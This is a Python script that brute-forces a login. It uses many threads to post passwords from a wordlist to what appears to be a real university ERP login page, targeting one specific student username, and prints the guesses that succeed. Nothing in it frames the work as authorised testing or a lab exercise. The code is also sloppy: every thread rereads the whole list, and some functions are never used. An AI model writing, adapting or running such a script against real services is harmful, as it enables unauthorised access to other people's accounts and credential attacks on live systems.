import threading
import time
import requests
import sys

start = time.perf_counter()

#user credentials
username = "4231220076"
url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
wordlist = "/usr/share/wordlists/rockyou.txt"


#getting wordlist length
def passwd_list_len():
    with open('/home/mark/Desktop/Github local/Safari/pass.txt', errors="replace" ) as f:
        return len(f.readlines())

threads = []


#bruteforcer
def forcer():
    with open('/home/mark/Desktop/Github local/Safari/pass.txt', errors="replace" ) as f:
        length = passwd_list_len()
        for _ in range(length):
            passwd = f.readline()
            data = {
                "username": username,
                "password": passwd
            }
            r = requests.post(url, data=data)
            if r.text == 'ok':
                print("Valid Password: %s"%passwd)
            else:
                print("Invalid Password %s"%passwd)


def forcer1():
    with open('pass.txt') as f:
        for passwd in f.readlines():
            data = {
                "username": username,
                "password": passwd
            }
            r = requests.post(url, data=data)
            if r.text == 'ok':
                print("Valid Password: %s"%passwd)
            else:
                print("Invalid Password %s"%passwd)

            


for _ in range(passwd_list_len()):
    t1 = threading.Thread(target=forcer1)           
    t1.start()
    threads.append(t1)

for thread in threads:
    thread.join()


forcer1()
#Checking for valid password   
def bingo(request, password):
    if request.text == "ok":
        print("Valid Password found: %s" %password)
    else:
        print("%s is invalid" %password)






finish = time.perf_counter()


print("finish time: %d" %(finish - start))

'''



def try_password(password):
    # Try the password and return True if it is correct, False otherwise
    return False

def brute_force_password(password_list):
    # Create a list to store the threads
    threads = []
    # Create a thread for each password in the list
    for password in password_list:
        thread = threading.Thread(target=try_password, args=(password,))
        thread.start()
        threads.append(thread)
    # Wait for all threads to complete
    for thread in threads:
        thread.join()

# Try all passwords in the list
password_list = ['password1', 'password2', 'password3']
brute_force_password(password_list)

'''